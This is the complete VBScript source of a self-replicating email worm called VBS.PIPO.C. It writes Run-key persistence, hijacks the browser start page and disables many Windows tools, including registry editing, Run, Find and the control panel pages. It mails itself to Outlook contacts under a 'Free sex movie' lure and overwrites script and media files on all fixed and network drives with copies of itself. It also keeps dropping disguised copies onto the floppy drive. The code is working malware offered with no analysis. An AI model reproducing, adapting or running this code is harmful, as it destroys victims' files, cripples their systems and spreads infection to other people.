'VBS.PIPO.C By sevenC
'http://sevenc.vze.com
'sevenC_zone@yahoo.com
'who else..?
On error resume next
randomize
set fso=createobject("scripting.filesystemobject")
set wscriptshell=createobject("wscript.shell")
wscriptshell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
wscriptshell.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "sevenc.vze.com"
wscriptshell.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page", "sectors.vze.com"
wscriptshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
wscriptshell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "sevenC"
wscriptshell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32", "C:\Windows\Shell32.vbs"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDiskCpl", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolder", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispAppearancePage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispBackgroundPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispScrSavPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispSettingsPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetup", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetupIDPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoFileSharingControl", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetupSecurityPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoSecCpl", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoProfilePage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoPwdPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoAddPrinter", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDeletePrinter", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPrinterTabs", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDevMgrPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoFileSysPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoVirtMemPage", 1, "REG_DWORD"
wscriptshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings", 1, "REG_DWORD"
set drives=fso.drives
for each drive in drives
if drive="C:" then
if drive.isready then
drivefull=drive & "\"
set e5d=fso.getfolder(drivefull)
set subs=e5d.subfolders
for each subfolder in subs
subst=mid(subfolder.path,4,3)
if subst="WIN" then
auto=subfolder.path
end if
next
end if
end if
next
autos=auto & "\run32dll.vbs"
fso.copyfile wscript.scriptfullname,autos
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" 
if wscript.scriptfullname <> autos then
msgbox "Cannot open file",16,"Internet Explorer"
end if
mailed=auto & "\sevenc.jpg.vbs"
fso.copyfile wscript.scriptfullname,mailed
if wscriptshell.regread("HKLM\SOFTWARE\Microsoft")<>"1" then
set out=createobject("Outlook.Application")
if out="Outlook" then 
set mapi=out.GetNameSpace("MAPI")
set newitem=mapi.getdefaultfolder(6)
do while newitem.items.count<>1
for each item in newitem.items
do while item.Attachments.count<>0
for each itatt in item.Attachments
itatt.delete
next
loop
item.subject="Free sex movie"
item.Body="This is free sex movie from http://sex.education.com"
item.attachments.add mailed
item.send
next
loop
set item=Nothing
set itatt=nothing
set newitem=Nothing
set newitem=mapi.getdefaultfolder(5)
do while newitem.items.count<>1
for each item in newitem.items
do while item.Attachments.count<>0
for each itatt in item.Attachments
itatt.delete
next
loop
item.subject="Free sex movie"
item.Body="This is free sex movie from http://sex.education.com"
item.attachments.add mailed
item.send
next
loop
set item=Nothing
set itatt=nothing
set newitem=Nothing
set newmail=out.createitem(0)
newmail.to=""
newmail.subject="it has been infection"
newmail.Body="Infection completed successfully"
newmail.send
set out=Nothing
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft","1"
end if
end if
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
list(d.path&"\")
end if
next
Sub spreadmailto (dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="vbs") or (ext="vba") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub list(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spreadmailto(fil.path)
list(fil.path)
next
End Sub
payl=wscriptshell.regread("HKLM\SOFTWARE\TaskManager")
if payl="" then 
wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager","1"
end if
if payl<> 2 then
payl=payl+1
wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager",payl
end if
if payl= 2 then
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
listed(d.path&"\")
end if
next
end if
Sub spread (dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="mp3") or (ext="jpeg") or (ext="mpg") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub listed(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spread(fil.path)
listed(fil.path)
next
End Sub
if month(now)= 2 and day(now)= 2 then
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
listed(d.path&"\")
end if
next
end if
Sub spread(dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="mp3") or (ext="jpeg") or (ext="mpg") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub listed(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spread(fil.path)
listed(fil.path)
next
End Sub
payl=wscriptshell.regread("HKLM\SOFTWARE\Tasks")
if payl="" then 
wscriptshell.regwrite "HKLM\SOFTWARE\Tasks","1"
end if
if payl<> 11 then
payl=payl+1
wscriptshell.regwrite "HKLM\SOFTWARE\Tasks",payl
end if
if payl=11 then
msgbox "helloo,nice to meet you...!",64,"Kagra Worm Generator"
end if
if month(now)= 1 and day(now)= 1 then
msgbox "helloo,nice to meet you...!",64,"Kagra Worm Generator"
end if
tim=minute(time)
tim=tim+6
set thiscode=fso.opentextfile(wscript.scriptfullname,1)
code=thiscode.readall
thiscode.close
do
if not (fso.fileexists(autos)) then
set resur=fso.createtextfile(autos,true)
resur.write code
resur.close
end if
regvalue=wscriptshell.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate")
if regvalue <> "wscript.exe" & " " & autos & " " & "%"  then 
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" 
end if
regvalue=""
timstandard=minute(time)
if tim>53 then
tim=01
end if
if timstandard=tim then
tim=minute(time)
tim=tim+6
trig=int((10*rnd)+1)
select case trig
case 1
floppya="a:\how_to_fuck.txt.vbs"
case 2
floppya="a:\fuck_with_your_girlfriend.txt.vbs"
case 3
floppya="a:\get_drink_tonight.txt.vbs"
case 4
floppya="a:\daisy_pic.JPG.vbs"
case 5
floppya="a:\daisy_fuck.JPG.vbs"
case 6
floppya="a:\hack_irc.txt.vbs"
case 7
floppya="a:\how_to_hack.TXT.vbs"
case 8
floppya="a:\fuck_with daisy.JPG.vbs"
case 9
floppya="a:\Sex_education.txt.vbs"
case else
floppya="a:\daisy_fuck_with_sevenc.JPG.vbs"
end select
set repla=fso.createtextfile(floppya,true)
repla.write code
repla.close
set repla=nothing
floppya=""
loop
